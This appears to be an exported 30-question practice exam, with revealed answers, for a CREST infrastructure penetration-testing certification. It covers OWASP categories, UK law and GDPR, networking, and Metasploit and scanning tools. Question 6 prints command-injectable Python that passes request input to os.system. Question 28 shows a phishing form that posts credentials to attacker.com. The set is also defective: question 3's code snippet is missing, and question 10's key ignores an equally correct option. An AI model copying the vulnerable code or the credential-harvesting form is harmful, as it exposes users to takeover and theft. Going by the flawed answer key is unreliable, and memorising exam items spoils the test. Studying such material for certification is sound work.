<table width="100%">
  <tr>
    <td align="center" valign="middle" width="50%">
      <p align="center"><img src="https://pub-6a9f8dede1194a7786cba69e7dcdad9f.r2.dev/certifications/CREST/CREST%20Certified%20Tester%20-%20Infrastructure%20(CCT%20INF)" width="50%"></p>
    </td>
    <td align="center" valign="middle" width="50%">
      <h1>Certified Tester - Infrastructure</h1>
    </td>
  </tr>
</table>

## 📑 Table of Contents

- [Application Security and Web Technologies](#application-security-and-web-technologies) (7 questions)
- [Legal, Regulatory, and Professional Standards](#legal-regulatory-and-professional-standards) (6 questions)
- [Network Infrastructure and Protocols](#network-infrastructure-and-protocols) (9 questions)
- [Security Testing Methodologies and Tools](#security-testing-methodologies-and-tools) (8 questions)

## 📋 Exam Information

| Field | Value |
|-------|-------|
| Total Questions | 30 |
| Level | Foundation |
| Exported At | 2026-08-04T06:27:29.202Z |
| Domains | 4 |

## 📊 Domain Distribution

| Domain | Questions |
|--------|-----------|
| Application Security and Web Technologies | 7 |
| Legal, Regulatory, and Professional Standards | 6 |
| Network Infrastructure and Protocols | 9 |
| Security Testing Methodologies and Tools | 8 |

---

### **Application Security and Web Technologies**

### 1. Which OWASP Top 10 category directly addresses failures in enforcing user permissions?

- [ ] **A)** A01: Broken Access Control
- [ ] **B)** A03: Injection
- [ ] **C)** A05: Security Misconfiguration
- [ ] **D)** A10: SSRF

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Broken Access Control (A01) is defined as failures in enforcing user permissions, including vertical and horizontal privilege escalation.
 
 
</details>

### 2. Which two characteristics are essential for secure session token generation?

- [ ] **A)** Use a cryptographically secure pseudorandom number generator
- [ ] **B)** Use a combination of server timestamp and random salt
- [ ] **C)** Use sequential counters
- [ ] **D)** Use high-entropy random strings

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, D**
 
> 💡  **Explanation** 
> 
> Secure tokens must be generated using a CSPRNG and be high-entropy, not timestamp-based or sequential.
 
 
</details>

### 3. Examine the code snippet. What vulnerability is present?

```CHECK
CHECK
```

- [ ] **A)** SQL injection
- [ ] **B)** Cross-Site Scripting
- [ ] **C)** Command injection
- [ ] **D)** Broken Access Control

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The code concatenates user input directly into an SQL query string, causing SQL injection vulnerability.
 
 
</details>

### 4. What is the primary defense against Cross-Site Scripting (XSS)?

- [ ] **A)** Output encoding
- [ ] **B)** Input validation
- [ ] **C)** HTTPS
- [ ] **D)** Rate limiting

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Context‑aware output encoding neutralises malicious characters and prevents XSS, whereas input validation is secondary.
 
 
</details>

### 5. Which two cookie flags should be set on session cookies to improve security?

- [ ] **A)** Secure
- [ ] **B)** HttpOnly
- [ ] **C)** SameSite=None
- [ ] **D)** Domain

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> Secure flag forces HTTPS only; HttpOnly prevents client‑side script access, mitigating XSS cookie theft.
 
 
</details>

### 6. Examine the code snippet. What vulnerability does it introduce?

```python
import os
user_input = request.GET.get('cmd')
os.system('echo ' + user_input)
```

- [ ] **A)** Command injection
- [ ] **B)** SQL injection
- [ ] **C)** Cross-Site Scripting
- [ ] **D)** Server-Side Request Forgery

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The code passes unsanitised user input to os.system, allowing arbitrary OS command execution.
 
 
</details>

### 7. Which OWASP Top 10 category involves the server making requests to internal resources based on user input?

- [ ] **A)** A10: SSRF
- [ ] **B)** A03: Injection
- [ ] **C)** A01: Broken Access Control
- [ ] **D)** A05: Security Misconfiguration

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> SSRF (A10) is defined as the vulnerability where an application fetches external resources without validation, often targeting internal services.
 
 
</details>


---

### **Legal, Regulatory, and Professional Standards**

### 8. Under the Computer Misuse Act 1990, Section 1, what key element must a penetration tester have to avoid committing an offence?

- [ ] **A)** Explicit written authorisation
- [ ] **B)** Verbal consent from the IT manager
- [ ] **C)** Implied permission from best practice
- [ ] **D)** A valid ethical hacking certificate

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The CMA Section 1 requires explicit written authorisation; verbal or implied consent is insufficient.
 
 
</details>

### 9. Which two GDPR principles must a penetration tester follow when processing personal data during an infrastructure test?

- [ ] **A)** Data minimisation
- [ ] **B)** Lawful basis for processing
- [ ] **C)** Public disclosure of findings
- [ ] **D)** Unlimited data retention

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> GDPR Articles 5 and 6 require data minimisation and a lawful basis; public disclosure and unlimited retention violate the regulation.
 
 
</details>

### 10. Review the test script in the code block. Which action would breach the Rules of Engagement if the RoE only allows scanning the 10.0.0.0/24 subnet?

```python
script = "nmap -sV 10.0.0.0/16"
```

- [ ] **A)** Scanning 10.0.1.1
- [ ] **B)** Scanning 10.0.0.1
- [ ] **C)** Scanning 10.0.0.0/24
- [ ] **D)** Scanning 10.0.0.0/16

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The RoE only authorises 10.0.0.0/24; scanning 10.0.1.1 falls outside that range and is an unauthorised access under the CMA.
 
 
</details>

### 11. In a CREST-compliant report, which section contains detailed exploit steps and proof-of-concept code?

- [ ] **A)** Executive summary
- [ ] **B)** Technical annex
- [ ] **C)** Risk matrix
- [ ] **D)** Distribution list

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> The technical annex contains exploit details; the executive summary only covers business impact.
 
 
</details>

### 12. According to the CREST Code of Conduct, which two items must be in place before starting an infrastructure test?

- [ ] **A)** Signed non-disclosure agreement
- [ ] **B)** Written authorisation from the system owner
- [ ] **C)** Public vulnerability report
- [ ] **D)** Backup of all test data

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> The code demands written authorisation and a signed NDA; public reports are post-engagement, and backups are not mandatory.
 
 
</details>

### 13. The code block shows a database query run during a test. Which data protection principle is violated by this action?

```sql
SELECT * FROM customers;
```

- [ ] **A)** Data minimisation
- [ ] **B)** Purpose limitation
- [ ] **C)** Accuracy
- [ ] **D)** Storage limitation

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The query extracts all customer data, violating the principle of data minimisation (only necessary data should be accessed).
 
 
</details>


---

### **Network Infrastructure and Protocols**

### 14. At which OSI layer does the IP protocol operate?

- [ ] **A)** Layer 2 (Data Link)
- [ ] **B)** Layer 3 (Network)
- [ ] **C)** Layer 4 (Transport)
- [ ] **D)** Layer 1 (Physical)

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> IP operates at Layer 3 (Network) and is responsible for logical addressing and routing.
 
 
</details>

### 15. Which of the following protocols operate at the Application Layer of the OSI model? (Select all that apply)

- [ ] **A)** HTTP
- [ ] **B)** TCP
- [ ] **C)** DNS
- [ ] **D)** ARP

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, C**
 
> 💡  **Explanation** 
> 
> HTTP and DNS are application layer protocols. TCP is transport layer, ARP is data link layer.
 
 
</details>

### 16. Based on the ARP table output shown, identify the OSI layer at which the ARP protocol primarily functions.

```text
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.1             ether   00:11:22:33:44:55   C                     eth0
192.168.1.100           ether   aa:bb:cc:dd:ee:ff   C                     eth0
```

- [ ] **A)** Layer 2 (Data Link)
- [ ] **B)** Layer 3 (Network)
- [ ] **C)** Layer 4 (Transport)
- [ ] **D)** Layer 7 (Application)

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> ARP maps IP addresses to MAC addresses and operates at Layer 2 (Data Link) within the local network.
 
 
</details>

### 17. What is the default TCP port for HTTPS traffic?

- [ ] **A)** 80
- [ ] **B)** 443
- [ ] **C)** 53
- [ ] **D)** 22

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> HTTPS uses TCP port 443 by default, providing encrypted communication via TLS/SSL.
 
 
</details>

### 18. Which statements about the TCP/IP model are true? (Select all that apply)

- [ ] **A)** It has 7 layers.
- [ ] **B)** It combines OSI Layers 5-7 into a single Application layer.
- [ ] **C)** The Internet layer is equivalent to OSI Layer 3.
- [ ] **D)** It includes a Presentation layer.

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B, C**
 
> 💡  **Explanation** 
> 
> The TCP/IP model has 4 layers; its Application layer encompasses OSI Layers 5-7, and the Internet layer corresponds to OSI Layer 3.
 
 
</details>

### 19. The packet capture shows a TCP handshake. Which OSI layer is primarily responsible for managing this connection establishment?

```text
10:00:00.123456 IP 192.168.1.10.5000 > 10.0.0.1.80: Flags [S], seq 1000...
10:00:00.123789 IP 10.0.0.1.80 > 192.168.1.10.5000: Flags [S.], seq 2000, ack 1001...
10:00:00.124000 IP 192.168.1.10.5000 > 10.0.0.1.80: Flags [.], ack 2001...
```

- [ ] **A)** Layer 4 (Transport)
- [ ] **B)** Layer 3 (Network)
- [ ] **C)** Layer 2 (Data Link)
- [ ] **D)** Layer 7 (Application)

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> TCP is a Transport layer protocol responsible for reliable connection establishment via the three-way handshake.
 
 
</details>

### 20. What is the first message sent by a DHCP client to obtain an IP address?

- [ ] **A)** DHCPOFFER
- [ ] **B)** DHCPREQUEST
- [ ] **C)** DHCPACK
- [ ] **D)** DHCPDISCOVER

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: D**
 
> 💡  **Explanation** 
> 
> The DHCP client sends a DHCPDISCOVER broadcast to locate servers, starting the DORA process.
 
 
</details>

### 21. Which DNS record types are valid? (Select all that apply)

- [ ] **A)** A
- [ ] **B)** MX
- [ ] **C)** ARP
- [ ] **D)** CNAME

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> A, MX, and CNAME are standard DNS record types. ARP is not a DNS record.
 
 
</details>

### 22. Refer to the switch configuration. Which attack does the bpduguard setting primarily prevent?

```cisco
interface FastEthernet0/1
 switchport mode access
 spanning-tree bpduguard enable
```

- [ ] **A)** VLAN hopping
- [ ] **B)** ARP spoofing
- [ ] **C)** STP manipulation (root bridge takeover)
- [ ] **D)** DHCP starvation

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: C**
 
> 💡  **Explanation** 
> 
> BPDU Guard disables a port if a BPDU is received, preventing rogue switches from manipulating Spanning Tree Protocol.
 
 
</details>


---

### **Security Testing Methodologies and Tools**

### 23. What is the primary purpose of the penetration testing lifecycle?

- [ ] **A)** Ensures consistency and defensibility
- [ ] **B)** Automates vulnerability detection
- [ ] **C)** Replaces manual testing
- [ ] **D)** Meets all compliance standards

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The lifecycle provides a repeatable, evidence-based process for professional security assessments.
 
 
</details>

### 24. Which of the following are passive reconnaissance techniques?

- [ ] **A)** Google dorking
- [ ] **B)** Port scanning
- [ ] **C)** Using Shodan
- [ ] **D)** Ping sweep

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, C**
 
> 💡  **Explanation** 
> 
> Passive reconnaissance uses public sources without direct interaction with the target.
 
 
</details>

### 25. Examine the command below and identify the vulnerability scanner being used.

```bash
openvas-scanner --start-scan --target=10.0.0.1
```

- [ ] **A)** Nessus
- [ ] **B)** OpenVAS
- [ ] **C)** Nmap
- [ ] **D)** Nexpose

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> The command 'openvas-scanner' is the command-line interface for OpenVAS.
 
 
</details>

### 26. In Metasploit, which module type delivers executable code after exploitation?

- [ ] **A)** exploit
- [ ] **B)** payload
- [ ] **C)** auxiliary
- [ ] **D)** encoder

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> Payload modules contain shellcode or stagers that run after exploitation.
 
 
</details>

### 27. Which countermeasures help prevent deauthentication attacks?

- [ ] **A)** Enable Management Frame Protection
- [ ] **B)** Use WPA3-SAE
- [ ] **C)** Disable SSID broadcast
- [ ] **D)** Use a Wireless Intrusion Prevention System

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, D**
 
> 💡  **Explanation** 
> 
> 802.11w protects management frames; WIPS detects and blocks attacks.
 
 
</details>

### 28. Examine the HTML snippet. What social engineering technique is being used?

```html
<form action='http://attacker.com/login' method='POST'><input type='text' name='username'><input type='password' name='password'><input type='submit'></form>
```

- [ ] **A)** Phishing
- [ ] **B)** Vishing
- [ ] **C)** Tailgating
- [ ] **D)** Smishing

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The HTML form captures credentials, typical of a phishing attack.
 
 
</details>

### 29. What is the main advantage of authenticated vulnerability scanning?

- [ ] **A)** Provides deeper insight into local configurations
- [ ] **B)** Is faster than unauthenticated scanning
- [ ] **C)** Only works on Windows systems
- [ ] **D)** Detects business logic flaws

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Authenticated scanning logs into the target, enabling enumeration of patches and settings.
 
 
</details>

### 30. Which are post-exploitation capabilities of Metasploit?

- [ ] **A)** Privilege escalation
- [ ] **B)** Port scanning
- [ ] **C)** Keylogging
- [ ] **D)** Payload generation

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, C**
 
> 💡  **Explanation** 
> 
> Post-exploitation includes privilege escalation and keylogging for lateral movement and data capture.
 
 
</details>
